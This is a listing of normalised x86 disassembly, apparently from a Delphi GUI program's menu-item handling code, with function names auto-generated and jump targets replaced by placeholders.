je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_450618
jmp r-xdata
mov eax ebx
call sub_44e678
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4522f0
sub_450670
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ ebx + 0x4c ] eax
sub_450698
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_40326c
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45092c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403468
mov edx ebx
mov eax edi
call sub_419450
mov eax ebx
mov si 0xffee
call sub_403468
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_450708
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov [ esi + 0x4c ] eax
sub_45073c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_450214
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_450224
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45077c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4505ac
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_450590
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450590
sub_4507e0
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_4500a4
sub_45080c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45007c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_4500ec
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_450140
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_404010
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45026c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4501b8
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_450248
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45025c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45092c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4501fc
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403468
sub_450950
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450970
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450990
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4509b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4509d0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4509f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450a10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450a30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450a50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450a70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414068
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44a8c0
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44a9f8
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44aa58
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44a758
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44ab18
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_450ae8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41969c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4501fc
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_450698
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_450b3c
jmp r-xdata
xor edx edx
mov eax esi
call sub_44e600
sub_450b3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44bfd4
mov eax ebx
call sub_450bac
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44c018
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419450
sub_450b84
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_450b84
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44dcd4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_450618
mov eax ebx
pop esi
pop ebx
retn
sub_450bc0
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c078
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_40451c
sub_450bf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404054
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_450c74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450d96
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40427c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40427c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4044dc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043c8
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450d9d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fe0
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404564
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40433c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40427c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4044dc
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_40433c
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_450dd4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_451273
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404054
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_451234
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_450214
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404054
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45127a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403fe0
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403fe0
lea eax [ ebp - 0x18 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
call sub_451428
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_450224
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043c8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_450bf0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_450224
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450224
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40326c
mov eax [ ebp - 0x20 ]
call sub_40326c
mov eax [ ebp - 0x14 ]
call sub_40326c
mov eax [ ebp - 0xc ]
call sub_40326c
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_450bf0
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40427c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_450224
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_452ccc
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407b4c
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_404010
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c078
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c078
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_450224
push eax
mov edx esi
mov eax ebx
call sub_450224
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4044dc
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407b4c
push ebp
mov eax [ ebp - 0x2c ]
call sub_450bc0
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_450bc0
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c078
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404054
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450224
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_450224
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_452c38
mov edx [ ebp - 0x40 ]
pop eax
call sub_404010
mov edx esi
mov eax ebx
call sub_450224
push eax
mov edx esi
mov eax ebx
call sub_450224
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40427c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4044dc
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_450c74
mov eax [ ebp - 0x18 ]
call sub_40427c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_40451c
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404564
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_450c74
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4512d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_450214
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_450214
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_451454
test al al
je r-xdata
mov eax esi
call sub_450214
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_450224
call sub_4512ac
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_450224
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_450224
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450224
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_450224
call sub_4512ac
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_450224
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450224
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450224
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_450224
call sub_4512ac
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_451428
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_451428
and eax 0x7f
mov al [ eax + rw-data ]
sub_451454
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_451454
and eax 0x7f
mov al [ eax + rw-data ]
sub_451480
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e168
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419380
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_4521ac
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45151c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40326c
mov eax [ esi + 0x44 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_451590
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_451590
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44dcd4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_450618
mov eax ebx
pop esi
pop ebx
retn
sub_4515d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_450214
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_450224
call sub_4515d0
pop ecx
test al al
je r-xdata
sub_451668
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4515d0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44dcd4
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_451698
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_451668
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_4529bc
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_451708
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_451668
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_451724
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_451668
mov edi eax
test edi edi
je r-xdata
